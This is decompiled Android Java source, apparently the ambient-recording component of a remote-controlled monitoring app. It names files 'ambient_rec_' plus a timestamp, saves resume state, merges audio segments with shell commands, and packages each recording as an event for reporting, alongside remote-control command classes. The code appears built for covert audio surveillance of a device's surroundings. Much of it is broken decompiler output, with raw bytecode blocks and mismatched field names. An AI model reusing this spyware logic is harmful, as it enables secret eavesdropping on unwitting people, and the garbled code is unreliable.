package com.vvt.appengine.a;

import android.os.ConditionVariable;
import android.os.Looper;
import com.vvt.a.c;
import com.vvt.appengine.AppEngine1;
import com.vvt.base.RunningMode;
import com.vvt.events.FxAudioAmbientEvent;
import com.vvt.events.FxMediaType;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;
import java.io.File;
import java.io.FilenameFilter;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.Date;
import java.util.Hashtable;
import java.util.List;

public class q
{
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.d;
  private static final boolean d = com.vvt.ak.a.e;
  c a;
  private String e;
  private String f;
  private String g;
  private String h;
  private AppEngine1 i;
  private RmtCtrlOutputStatusMessage j;
  private ConditionVariable k;
  private Looper l;
  
  public q()
  {
    u localu = new com/vvt/appengine/a/u;
    localu.<init>(this);
    this.a = localu;
  }
  
  /* Error */
  private String a(String paramString1, String paramString2, File[] paramArrayOfFile)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore 4
    //   3: aconst_null
    //   4: astore 5
    //   6: aload_3
    //   7: ifnull +586 -> 593
    //   10: aload_3
    //   11: arraylength
    //   12: istore 6
    //   14: iload 6
    //   16: ifle +577 -> 593
    //   19: aload_3
    //   20: iconst_0
    //   21: aaload
    //   22: invokevirtual 60	java/io/File:getAbsolutePath	()Ljava/lang/String;
    //   25: astore 7
    //   27: aload_3
    //   28: iconst_0
    //   29: aaload
    //   30: astore 5
    //   32: aload 5
    //   34: invokevirtual 63	java/io/File:getName	()Ljava/lang/String;
    //   37: astore 8
    //   39: new 56	java/io/File
    //   42: astore 9
    //   44: aload 9
    //   46: aload 7
    //   48: invokespecial 66	java/io/File:<init>	(Ljava/lang/String;)V
    //   51: aload_3
    //   52: arraylength
    //   53: istore 4
    //   55: iconst_1
    //   56: istore 10
    //   58: iload 4
    //   60: iload 10
    //   62: if_icmple +488 -> 550
    //   65: ldc 69
    //   67: astore 5
    //   69: aload_1
    //   70: aload 5
    //   72: invokestatic 74	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   75: astore 11
    //   77: iconst_0
    //   78: istore 12
    //   80: aconst_null
    //   81: astore 13
    //   83: iconst_0
    //   84: istore 10
    //   86: aconst_null
    //   87: astore 14
    //   89: new 56	java/io/File
    //   92: astore 5
    //   94: aload 5
    //   96: aload 11
    //   98: invokespecial 66	java/io/File:<init>	(Ljava/lang/String;)V
    //   101: aload 5
    //   103: invokevirtual 78	java/io/File:createNewFile	()Z
    //   106: pop
    //   107: new 80	java/io/BufferedWriter
    //   110: astore 14
    //   112: new 82	java/io/FileWriter
    //   115: astore 15
    //   117: iconst_1
    //   118: istore 16
    //   120: aload 15
    //   122: aload 5
    //   124: iload 16
    //   126: invokespecial 85	java/io/FileWriter:<init>	(Ljava/io/File;Z)V
    //   129: aload 14
    //   131: aload 15
    //   133: invokespecial 88	java/io/BufferedWriter:<init>	(Ljava/io/Writer;)V
    //   136: aload_3
    //   137: arraylength
    //   138: istore 17
    //   140: iconst_0
    //   141: istore 12
    //   143: aconst_null
    //   144: astore 13
    //   146: iload 12
    //   148: iload 17
    //   150: if_icmpge +484 -> 634
    //   153: aload_3
    //   154: iload 12
    //   156: aaload
    //   157: astore 18
    //   159: new 90	java/lang/StringBuilder
    //   162: astore 19
    //   164: aload 19
    //   166: invokespecial 91	java/lang/StringBuilder:<init>	()V
    //   169: ldc 93
    //   171: astore 20
    //   173: aload 19
    //   175: aload 20
    //   177: invokevirtual 97	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   180: astore 19
    //   182: aload 18
    //   184: invokevirtual 60	java/io/File:getAbsolutePath	()Ljava/lang/String;
    //   187: astore 18
    //   189: aload 19
    //   191: aload 18
    //   193: invokevirtual 97	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   196: astore 18
    //   198: ldc 99
    //   200: astore 19
    //   202: aload 18
    //   204: aload 19
    //   206: invokevirtual 97	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   209: astore 18
    //   211: aload 18
    //   213: invokevirtual 102	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   216: astore 18
    //   218: aload 14
    //   220: aload 18
    //   222: invokevirtual 105	java/io/BufferedWriter:append	(Ljava/lang/CharSequence;)Ljava/io/Writer;
    //   225: pop
    //   226: iload 12
    //   228: iconst_1
    //   229: iadd
    //   230: istore 12
    //   232: goto -86 -> 146
    //   235: astore 5
    //   237: iconst_0
    //   238: istore 4
    //   240: aconst_null
    //   241: astore 5
    //   243: iconst_0
    //   244: istore 10
    //   246: aconst_null
    //   247: astore 14
    //   249: getstatic 36	com/vvt/appengine/a/q:d	Z
    //   252: istore 12
    //   254: iload 12
    //   256: ifeq +3 -> 259
    //   259: aload 14
    //   261: ifnull +8 -> 269
    //   264: aload 14
    //   266: invokevirtual 108	java/io/BufferedWriter:close	()V
    //   269: aload_2
    //   270: ldc 110
    //   272: invokestatic 74	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   275: astore 13
    //   277: iconst_0
    //   278: istore 10
    //   280: aconst_null
    //   281: astore 14
    //   283: new 90	java/lang/StringBuilder
    //   286: astore 15
    //   288: aload 15
    //   290: invokespecial 91	java/lang/StringBuilder:<init>	()V
    //   293: ldc 112
    //   295: astore 18
    //   297: aload 15
    //   299: aload 18
    //   301: invokevirtual 97	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   304: astore 15
    //   306: aload 15
    //   308: aload 8
    //   310: invokevirtual 97	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   313: astore 15
    //   315: aload 15
    //   317: invokevirtual 102	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   320: astore 15
    //   322: aload_1
    //   323: aload 15
    //   325: invokestatic 74	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   328: astore 15
    //   330: ldc 114
    //   332: astore 18
    //   334: iconst_3
    //   335: istore 21
    //   337: iload 21
    //   339: anewarray 4	java/lang/Object
    //   342: astore 19
    //   344: aconst_null
    //   345: astore 20
    //   347: aload 19
    //   349: iconst_0
    //   350: aload 13
    //   352: aastore
    //   353: iconst_1
    //   354: istore 12
    //   356: aload 19
    //   358: iload 12
    //   360: aload 11
    //   362: aastore
    //   363: iconst_2
    //   364: istore 12
    //   366: aload 19
    //   368: iload 12
    //   370: aload 15
    //   372: aastore
    //   373: aload 18
    //   375: aload 19
    //   377: invokestatic 122	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   380: astore 13
    //   382: invokestatic 127	com/vvt/shell/f:a	()Lcom/vvt/shell/f;
    //   385: astore 14
    //   387: aload 14
    //   389: aload 13
    //   391: invokevirtual 130	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   394: pop
    //   395: getstatic 29	com/vvt/appengine/a/q:removeFromPath	Z
    //   398: istore 12
    //   400: iload 12
    //   402: ifeq +3 -> 405
    //   405: new 56	java/io/File
    //   408: astore 13
    //   410: aload 13
    //   412: aload 15
    //   414: invokespecial 66	java/io/File:<init>	(Ljava/lang/String;)V
    //   417: aload 13
    //   419: invokevirtual 133	java/io/File:exists	()Z
    //   422: istore 22
    //   424: iload 22
    //   426: ifeq +11 -> 437
    //   429: aload 13
    //   431: aload 9
    //   433: invokevirtual 137	java/io/File:renameTo	(Ljava/io/File;)Z
    //   436: pop
    //   437: aload_3
    //   438: arraylength
    //   439: istore 23
    //   441: iconst_0
    //   442: istore 12
    //   444: aconst_null
    //   445: astore 13
    //   447: iload 12
    //   449: iload 23
    //   451: if_icmpge +165 -> 616
    //   454: aload_3
    //   455: iload 12
    //   457: aaload
    //   458: astore 11
    //   460: aload 11
    //   462: invokevirtual 63	java/io/File:getName	()Ljava/lang/String;
    //   465: astore 15
    //   467: aload 15
    //   469: aload 8
    //   471: invokevirtual 141	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   474: istore 17
    //   476: iload 17
    //   478: ifne +9 -> 487
    //   481: aload 11
    //   483: invokevirtual 144	java/io/File:delete	()Z
    //   486: pop
    //   487: iload 12
    //   489: iconst_1
    //   490: iadd
    //   491: istore 12
    //   493: goto -46 -> 447
    //   496: astore 5
    //   498: iconst_0
    //   499: istore 10
    //   501: aconst_null
    //   502: astore 14
    //   504: aload 14
    //   506: ifnull +8 -> 514
    //   509: aload 14
    //   511: invokevirtual 108	java/io/BufferedWriter:close	()V
    //   514: aload 5
    //   516: athrow
    //   517: astore 13
    //   519: getstatic 36	com/vvt/appengine/a/q:d	Z
    //   522: istore 12
    //   524: iload 12
    //   526: ifeq +3 -> 529
    //   529: aload 14
    //   531: ifnull +8 -> 539
    //   534: aload 14
    //   536: invokevirtual 146	com/vvt/shell/f:d	()V
    //   539: aload 5
    //   541: ifnull +9 -> 550
    //   544: aload 5
    //   546: invokevirtual 144	java/io/File:delete	()Z
    //   549: pop
    //   550: aload 7
    //   552: astore 5
    //   554: getstatic 29	com/vvt/appengine/a/q:removeFromPath	Z
    //   557: istore 6
    //   559: iload 6
    //   561: ifeq +3 -> 564
    //   564: aload 5
    //   566: areturn
    //   567: astore 7
    //   569: aload 14
    //   571: ifnull +8 -> 579
    //   574: aload 14
    //   576: invokevirtual 146	com/vvt/shell/f:d	()V
    //   579: aload 5
    //   581: ifnull +9 -> 590
    //   584: aload 5
    //   586: invokevirtual 144	java/io/File:delete	()Z
    //   589: pop
    //   590: aload 7
    //   592: athrow
    //   593: getstatic 36	com/vvt/appengine/a/q:d	Z
    //   596: istore 6
    //   598: iload 6
    //   600: ifeq -46 -> 554
    //   603: goto -49 -> 554
    //   606: astore 7
    //   608: goto -94 -> 514
    //   611: astore 14
    //   613: goto -344 -> 269
    //   616: aload 14
    //   618: ifnull +8 -> 626
    //   621: aload 14
    //   623: invokevirtual 146	com/vvt/shell/f:d	()V
    //   626: aload 5
    //   628: ifnull -78 -> 550
    //   631: goto -87 -> 544
    //   634: aload 14
    //   636: ifnull -367 -> 269
    //   639: aload 14
    //   641: invokevirtual 108	java/io/BufferedWriter:close	()V
    //   644: goto -375 -> 269
    //   647: astore 5
    //   649: goto -145 -> 504
    //   652: astore 14
    //   654: iconst_0
    //   655: istore 10
    //   657: aconst_null
    //   658: astore 14
    //   660: goto -411 -> 249
    //   663: astore 13
    //   665: goto -416 -> 249
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	668	0	this	q
    //   0	668	1	paramString1	String
    //   0	668	2	paramString2	String
    //   0	668	3	paramArrayOfFile	File[]
    //   1	238	4	m	int
    //   4	119	5	localObject1	Object
    //   235	1	5	localIOException1	java.io.IOException
    //   241	1	5	localObject2	Object
    //   496	49	5	localObject3	Object
    //   552	75	5	localObject4	Object
    //   647	1	5	localObject5	Object
    //   12	3	6	n	int
    //   557	42	6	bool1	boolean
    //   25	526	7	str1	String
    //   567	24	7	localObject6	Object
    //   606	1	7	localIOException2	java.io.IOException
    //   37	433	8	str2	String
    //   42	390	9	localFile	File
    //   56	600	10	i1	int
    //   75	407	11	localObject7	Object
    //   78	153	12	i2	int
    //   252	107	12	bool2	boolean
    //   364	5	12	i3	int
    //   398	93	12	i4	int
    //   491	1	12	i5	int
    //   522	3	12	bool3	boolean
    //   81	365	13	localObject8	Object
    //   517	1	13	localException	Exception
    //   663	1	13	localIOException3	java.io.IOException
    //   87	488	14	localObject9	Object
    //   611	29	14	localIOException4	java.io.IOException
    //   652	1	14	localIOException5	java.io.IOException
    //   658	1	14	localObject10	Object
    //   115	353	15	localObject11	Object
    //   118	7	16	bool4	boolean
    //   138	13	17	i6	int
    //   474	3	17	bool5	boolean
    //   157	217	18	localObject12	Object
    //   162	214	19	localObject13	Object
    //   171	175	20	str3	String
    //   335	3	21	i7	int
    //   422	3	22	bool6	boolean
    //   439	13	23	i8	int
    // Exception table:
    //   from	to	target	type
    //   89	92	235	java/io/IOException
    //   96	101	235	java/io/IOException
    //   89	92	496	finally
    //   96	101	496	finally
    //   101	107	496	finally
    //   107	110	496	finally
    //   112	115	496	finally
    //   124	129	496	finally
    //   131	136	496	finally
    //   283	286	517	java/lang/Exception
    //   288	293	517	java/lang/Exception
    //   299	304	517	java/lang/Exception
    //   308	313	517	java/lang/Exception
    //   315	320	517	java/lang/Exception
    //   323	328	517	java/lang/Exception
    //   337	342	517	java/lang/Exception
    //   350	353	517	java/lang/Exception
    //   360	363	517	java/lang/Exception
    //   370	373	517	java/lang/Exception
    //   375	380	517	java/lang/Exception
    //   382	385	517	java/lang/Exception
    //   389	395	517	java/lang/Exception
    //   395	398	517	java/lang/Exception
    //   405	408	517	java/lang/Exception
    //   412	417	517	java/lang/Exception
    //   417	422	517	java/lang/Exception
    //   431	437	517	java/lang/Exception
    //   437	439	517	java/lang/Exception
    //   455	458	517	java/lang/Exception
    //   460	465	517	java/lang/Exception
    //   469	474	517	java/lang/Exception
    //   481	487	517	java/lang/Exception
    //   283	286	567	finally
    //   288	293	567	finally
    //   299	304	567	finally
    //   308	313	567	finally
    //   315	320	567	finally
    //   323	328	567	finally
    //   337	342	567	finally
    //   350	353	567	finally
    //   360	363	567	finally
    //   370	373	567	finally
    //   375	380	567	finally
    //   382	385	567	finally
    //   389	395	567	finally
    //   395	398	567	finally
    //   405	408	567	finally
    //   412	417	567	finally
    //   417	422	567	finally
    //   431	437	567	finally
    //   437	439	567	finally
    //   455	458	567	finally
    //   460	465	567	finally
    //   469	474	567	finally
    //   481	487	567	finally
    //   519	522	567	finally
    //   509	514	606	java/io/IOException
    //   264	269	611	java/io/IOException
    //   639	644	611	java/io/IOException
    //   136	138	647	finally
    //   154	157	647	finally
    //   159	162	647	finally
    //   164	169	647	finally
    //   175	180	647	finally
    //   182	187	647	finally
    //   191	196	647	finally
    //   204	209	647	finally
    //   211	216	647	finally
    //   220	226	647	finally
    //   249	252	647	finally
    //   101	107	652	java/io/IOException
    //   107	110	652	java/io/IOException
    //   112	115	652	java/io/IOException
    //   124	129	652	java/io/IOException
    //   131	136	652	java/io/IOException
    //   136	138	663	java/io/IOException
    //   154	157	663	java/io/IOException
    //   159	162	663	java/io/IOException
    //   164	169	663	java/io/IOException
    //   175	180	663	java/io/IOException
    //   182	187	663	java/io/IOException
    //   191	196	663	java/io/IOException
    //   204	209	663	java/io/IOException
    //   211	216	663	java/io/IOException
    //   220	226	663	java/io/IOException
  }
  
  private String a(Hashtable paramHashtable)
  {
    Object localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    localObject1 = ((StringBuilder)localObject1).append("ambient_rec_");
    Object localObject2 = new java/text/SimpleDateFormat;
    ((SimpleDateFormat)localObject2).<init>("yyyyMMdd_HHmmss");
    Object localObject3 = new java/util/Date;
    ((Date)localObject3).<init>();
    localObject2 = ((SimpleDateFormat)localObject2).format((Date)localObject3);
    localObject1 = (String)localObject2;
    this.f = ((String)localObject1);
    localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    localObject2 = this.g;
    localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
    localObject2 = this.f;
    localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
    localObject2 = c();
    localObject1 = (String)localObject2;
    if (paramHashtable != null)
    {
      localObject3 = this.f;
      paramHashtable.put("filename_without_extension", localObject3);
      localObject2 = "is_resume";
      localObject3 = "1";
      paramHashtable.put(localObject2, localObject3);
    }
    return (String)localObject1;
  }
  
  private void a(String paramString, long paramLong)
  {
    boolean bool1 = b;
    if (bool1) {}
    long l1 = d();
    long l2 = paramLong / 1000L;
    boolean bool2 = b;
    if (bool2) {}
    FxAudioAmbientEvent localFxAudioAmbientEvent = new com/vvt/events/FxAudioAmbientEvent;
    localFxAudioAmbientEvent.<init>();
    localFxAudioAmbientEvent.setEventId(l1);
    long l3 = System.currentTimeMillis() - paramLong;
    localFxAudioAmbientEvent.setEventTime(l3);
    localFxAudioAmbientEvent.setParingId(l1);
    Object localObject1 = c();
    Object localObject2 = ".mp3";
    if (localObject1 == localObject2)
    {
      localObject1 = FxMediaType.MP3;
      localFxAudioAmbientEvent.setFormat((FxMediaType)localObject1);
    }
    for (;;)
    {
      localFxAudioAmbientEvent.setDuration(l2);
      localFxAudioAmbientEvent.setFilePath(paramString);
      localObject1 = d(paramString);
      localFxAudioAmbientEvent.setFileName((String)localObject1);
      localObject1 = new java/util/ArrayList;
      ((ArrayList)localObject1).<init>();
      ((List)localObject1).add(localFxAudioAmbientEvent);
      localObject2 = this.i.h;
      ((com.vvt.appengine.q)localObject2).a((List)localObject1);
      bool1 = b;
      if (bool1) {}
      return;
      localObject1 = FxMediaType.AMR_NB;
      localFxAudioAmbientEvent.setFormat((FxMediaType)localObject1);
    }
  }
  
  private void a(Hashtable paramHashtable, String paramString)
  {
    String str1 = "%s/%s";
    int m = 2;
    try
    {
      Object[] arrayOfObject = new Object[m];
      int n = 0;
      arrayOfObject[0] = paramString;
      n = 1;
      String str2 = "resume_ar.dat";
      arrayOfObject[n] = str2;
      str1 = String.format(str1, arrayOfObject);
      boolean bool1 = b;
      if (bool1) {}
      com.vvt.io.q.a(paramHashtable, str1);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = d;
        if (!bool2) {}
      }
    }
    bool2 = b;
    if (bool2) {}
  }
  
  private File[] a(String paramString1, String paramString2)
  {
    Object localObject1 = new java/io/File;
    ((File)localObject1).<init>(paramString2);
    Object localObject2 = new com/vvt/appengine/a/s;
    ((s)localObject2).<init>(this, paramString1);
    localObject1 = ((File)localObject1).listFiles((FilenameFilter)localObject2);
    if (localObject1 != null)
    {
      int m = localObject1.length;
      if (m > 0)
      {
        localObject2 = new com/vvt/appengine/a/t;
        ((t)localObject2).<init>(this);
        Arrays.sort((Object[])localObject1, (Comparator)localObject2);
      }
    }
    return (File[])localObject1;
  }
  
  private Hashtable b(String paramString)
  {
    localHashtable1 = new java/util/Hashtable;
    localHashtable1.<init>();
    Object localObject1 = "%s/%s";
    int m = 2;
    try
    {
      Object localObject2 = new Object[m];
      int n = 0;
      localObject2[0] = paramString;
      n = 1;
      String str = "resume_ar.dat";
      localObject2[n] = str;
      localObject1 = String.format((String)localObject1, (Object[])localObject2);
      localObject2 = new java/io/File;
      ((File)localObject2).<init>((String)localObject1);
      boolean bool1 = ((File)localObject2).exists();
      if (!bool1) {
        break label113;
      }
      localObject1 = com.vvt.io.q.a((String)localObject1);
      if (localObject1 == null) {
        break label113;
      }
      bool1 = localObject1 instanceof Hashtable;
      if (!bool1) {
        break label113;
      }
      localObject1 = (Hashtable)localObject1;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = d;
        if (bool2) {}
        Hashtable localHashtable2 = localHashtable1;
      }
    }
    return (Hashtable)localObject1;
  }
  
  private String c()
  {
    boolean bool = com.vvt.aa.a.d();
    Object localObject;
    if (bool)
    {
      localObject = this.i.d();
      RunningMode localRunningMode = RunningMode.FULL;
      if (localObject == localRunningMode)
      {
        localObject = this.i.d();
        localRunningMode = RunningMode.FULL;
        if (localObject == localRunningMode)
        {
          bool = com.vvt.aa.a.b();
          if (bool)
          {
            bool = com.vvt.aa.a.g();
            if (bool) {
              localObject = ".3gp";
            }
          }
        }
      }
    }
    for (;;)
    {
      return (String)localObject;
      localObject = ".mp3";
      continue;
      localObject = ".amr";
    }
  }
  
  private void c(String paramString)
  {
    Object localObject = new Object[2];
    localObject[0] = paramString;
    localObject[1] = "resume_ar.dat";
    String str = String.format("%s/%s", (Object[])localObject);
    localObject = new java/io/File;
    ((File)localObject).<init>(str);
    ((File)localObject).delete();
  }
  
  /* Error */
  private long d()
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: iconst_m1
    //   3: i2l
    //   4: lstore_2
    //   5: new 56	java/io/File
    //   8: astore 4
    //   10: aload_0
    //   11: getfield 319	com/vvt/appengine/a/q:AppEngine1	Ljava/lang/String;
    //   14: astore 5
    //   16: aload 4
    //   18: aload 5
    //   20: invokespecial 66	java/io/File:<init>	(Ljava/lang/String;)V
    //   23: aload 4
    //   25: invokevirtual 133	java/io/File:exists	()Z
    //   28: istore 6
    //   30: iload 6
    //   32: ifeq +191 -> 223
    //   35: new 321	java/io/FileInputStream
    //   38: astore 7
    //   40: aload 7
    //   42: aload 4
    //   44: invokespecial 324	java/io/FileInputStream:<init>	(Ljava/io/File;)V
    //   47: new 326	java/io/DataInputStream
    //   50: astore 8
    //   52: aload 8
    //   54: aload 7
    //   56: invokespecial 329	java/io/DataInputStream:<init>	(Ljava/io/InputStream;)V
    //   59: aload 8
    //   61: invokevirtual 332	java/io/DataInputStream:readLong	()J
    //   64: lstore 9
    //   66: aload 8
    //   68: invokevirtual 333	java/io/DataInputStream:close	()V
    //   71: aload 7
    //   73: invokestatic 337	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   76: getstatic 29	com/vvt/appengine/a/q:removeFromPath	Z
    //   79: istore 11
    //   81: iload 11
    //   83: ifeq +3 -> 86
    //   86: lconst_1
    //   87: lstore_2
    //   88: lload 9
    //   90: lload_2
    //   91: ladd
    //   92: lstore 12
    //   94: new 341	java/io/FileOutputStream
    //   97: astore 5
    //   99: iconst_0
    //   100: istore 14
    //   102: aconst_null
    //   103: astore 15
    //   105: aload 5
    //   107: aload 4
    //   109: iconst_0
    //   110: invokespecial 342	java/io/FileOutputStream:<init>	(Ljava/io/File;Z)V
    //   113: new 344	java/io/DataOutputStream
    //   116: astore 15
    //   118: aload 15
    //   120: aload 5
    //   122: invokespecial 347	java/io/DataOutputStream:<init>	(Ljava/io/OutputStream;)V
    //   125: aload 15
    //   127: lload 12
    //   129: invokevirtual 350	java/io/DataOutputStream:writeLong	(J)V
    //   132: aload 15
    //   134: invokevirtual 351	java/io/DataOutputStream:close	()V
    //   137: aload 5
    //   139: invokestatic 353	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   142: getstatic 29	com/vvt/appengine/a/q:removeFromPath	Z
    //   145: istore 6
    //   147: iload 6
    //   149: ifeq +3 -> 152
    //   152: lload 12
    //   154: lreturn
    //   155: astore 5
    //   157: iconst_0
    //   158: istore 6
    //   160: aconst_null
    //   161: astore 5
    //   163: getstatic 36	com/vvt/appengine/a/q:d	Z
    //   166: istore 16
    //   168: iload 16
    //   170: ifeq +3 -> 173
    //   173: aload 5
    //   175: invokestatic 337	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   178: lload_2
    //   179: lstore 9
    //   181: goto -105 -> 76
    //   184: astore 5
    //   186: aconst_null
    //   187: astore 7
    //   189: getstatic 36	com/vvt/appengine/a/q:d	Z
    //   192: istore 6
    //   194: iload 6
    //   196: ifeq +3 -> 199
    //   199: aload 7
    //   201: invokestatic 337	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   204: lload_2
    //   205: lstore 9
    //   207: goto -131 -> 76
    //   210: astore 5
    //   212: aconst_null
    //   213: astore 7
    //   215: aload 7
    //   217: invokestatic 337	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   220: aload 5
    //   222: athrow
    //   223: getstatic 33	com/vvt/appengine/a/q:MyUncaughtExceptionHandler	Z
    //   226: istore 6
    //   228: iload 6
    //   230: ifeq +3 -> 233
    //   233: lload_2
    //   234: lstore 9
    //   236: goto -150 -> 86
    //   239: astore 5
    //   241: getstatic 36	com/vvt/appengine/a/q:d	Z
    //   244: istore 6
    //   246: iload 6
    //   248: ifeq +3 -> 251
    //   251: aload_1
    //   252: invokestatic 353	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   255: goto -113 -> 142
    //   258: astore 5
    //   260: iconst_0
    //   261: istore 6
    //   263: aconst_null
    //   264: astore 5
    //   266: getstatic 36	com/vvt/appengine/a/q:d	Z
    //   269: istore 14
    //   271: iload 14
    //   273: ifeq -136 -> 137
    //   276: goto -139 -> 137
    //   279: astore 5
    //   281: aload_1
    //   282: invokestatic 353	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   285: aload 5
    //   287: athrow
    //   288: astore 17
    //   290: aload 5
    //   292: astore_1
    //   293: aload 17
    //   295: astore 5
    //   297: goto -16 -> 281
    //   300: astore 15
    //   302: goto -36 -> 266
    //   305: astore 15
    //   307: aload 5
    //   309: astore_1
    //   310: goto -69 -> 241
    //   313: astore 5
    //   315: goto -100 -> 215
    //   318: astore 17
    //   320: aload 5
    //   322: astore 7
    //   324: aload 17
    //   326: astore 5
    //   328: goto -113 -> 215
    //   331: astore 5
    //   333: goto -144 -> 189
    //   336: astore 5
    //   338: aload 7
    //   340: astore 5
    //   342: goto -179 -> 163
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	345	0	this	q
    //   1	309	1	localObject1	Object
    //   4	230	2	l1	long
    //   8	100	4	localFile	File
    //   14	124	5	localObject2	Object
    //   155	1	5	localFileNotFoundException1	java.io.FileNotFoundException
    //   161	13	5	localInputStream	java.io.InputStream
    //   184	1	5	localIOException1	java.io.IOException
    //   210	11	5	localObject3	Object
    //   239	1	5	localFileNotFoundException2	java.io.FileNotFoundException
    //   258	1	5	localIOException2	java.io.IOException
    //   264	1	5	localObject4	Object
    //   279	12	5	localObject5	Object
    //   295	13	5	localObject6	Object
    //   313	8	5	localObject7	Object
    //   326	1	5	localObject8	Object
    //   331	1	5	localIOException3	java.io.IOException
    //   336	1	5	localFileNotFoundException3	java.io.FileNotFoundException
    //   340	1	5	localObject9	Object
    //   28	234	6	bool1	boolean
    //   38	301	7	localObject10	Object
    //   50	17	8	localDataInputStream	java.io.DataInputStream
    //   64	171	9	l2	long
    //   79	3	11	bool2	boolean
    //   92	61	12	l3	long
    //   100	172	14	bool3	boolean
    //   103	30	15	localDataOutputStream	java.io.DataOutputStream
    //   300	1	15	localIOException4	java.io.IOException
    //   305	1	15	localFileNotFoundException4	java.io.FileNotFoundException
    //   166	3	16	bool4	boolean
    //   288	6	17	localObject11	Object
    //   318	7	17	localObject12	Object
    // Exception table:
    //   from	to	target	type
    //   35	38	155	java/io/FileNotFoundException
    //   42	47	155	java/io/FileNotFoundException
    //   35	38	184	java/io/IOException
    //   42	47	184	java/io/IOException
    //   35	38	210	finally
    //   42	47	210	finally
    //   94	97	239	java/io/FileNotFoundException
    //   109	113	239	java/io/FileNotFoundException
    //   94	97	258	java/io/IOException
    //   109	113	258	java/io/IOException
    //   94	97	279	finally
    //   109	113	279	finally
    //   241	244	279	finally
    //   113	116	288	finally
    //   120	125	288	finally
    //   127	132	288	finally
    //   132	137	288	finally
    //   266	269	288	finally
    //   113	116	300	java/io/IOException
    //   120	125	300	java/io/IOException
    //   127	132	300	java/io/IOException
    //   132	137	300	java/io/IOException
    //   113	116	305	java/io/FileNotFoundException
    //   120	125	305	java/io/FileNotFoundException
    //   127	132	305	java/io/FileNotFoundException
    //   132	137	305	java/io/FileNotFoundException
    //   47	50	313	finally
    //   54	59	313	finally
    //   59	64	313	finally
    //   66	71	313	finally
    //   189	192	313	finally
    //   163	166	318	finally
    //   47	50	331	java/io/IOException
    //   54	59	331	java/io/IOException
    //   59	64	331	java/io/IOException
    //   66	71	331	java/io/IOException
    //   47	50	336	java/io/FileNotFoundException
    //   54	59	336	java/io/FileNotFoundException
    //   59	64	336	java/io/FileNotFoundException
    //   66	71	336	java/io/FileNotFoundException
  }
  
  private String d(String paramString)
  {
    String[] arrayOfString = paramString.split("/");
    int m = arrayOfString.length + -1;
    return arrayOfString[m];
  }
  
  /* Error */
  private int e(String paramString)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_2
    //   2: aconst_null
    //   3: astore_3
    //   4: iconst_0
    //   5: istore 4
    //   7: aconst_null
    //   8: astore 5
    //   10: new 365	android/media/MediaMetadataRetriever
    //   13: astore 6
    //   15: aload 6
    //   17: invokespecial 366	android/media/MediaMetadataRetriever:<init>	()V
    //   20: aload 6
    //   22: aload_1
    //   23: invokevirtual 369	android/media/MediaMetadataRetriever:setDataSource	(Ljava/lang/String;)V
    //   26: bipush 9
    //   28: istore 4
    //   30: aload 6
    //   32: iload 4
    //   34: invokevirtual 374	android/media/MediaMetadataRetriever:extractMetadata	(I)Ljava/lang/String;
    //   37: astore 5
    //   39: aload 5
    //   41: invokestatic 379	java/lang/Integer:parseInt	(Ljava/lang/String;)I
    //   44: istore_2
    //   45: aload 6
    //   47: ifnull +8 -> 55
    //   50: aload 6
    //   52: invokevirtual 382	android/media/MediaMetadataRetriever:release	()V
    //   55: iload_2
    //   56: ireturn
    //   57: astore 6
    //   59: aconst_null
    //   60: astore 6
    //   62: getstatic 36	com/vvt/appengine/a/q:d	Z
    //   65: istore 4
    //   67: iload 4
    //   69: ifeq +3 -> 72
    //   72: aload 6
    //   74: ifnull -19 -> 55
    //   77: goto -27 -> 50
    //   80: astore_3
    //   81: aconst_null
    //   82: astore 6
    //   84: aload 6
    //   86: ifnull +8 -> 94
    //   89: aload 6
    //   91: invokevirtual 382	android/media/MediaMetadataRetriever:release	()V
    //   94: aload_3
    //   95: athrow
    //   96: astore_3
    //   97: goto -13 -> 84
    //   100: astore 5
    //   102: goto -40 -> 62
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	105	0	this	q
    //   0	105	1	paramString	String
    //   1	55	2	m	int
    //   3	1	3	localObject1	Object
    //   80	15	3	localObject2	Object
    //   96	1	3	localObject3	Object
    //   5	28	4	n	int
    //   65	3	4	bool	boolean
    //   8	32	5	str	String
    //   100	1	5	localException1	Exception
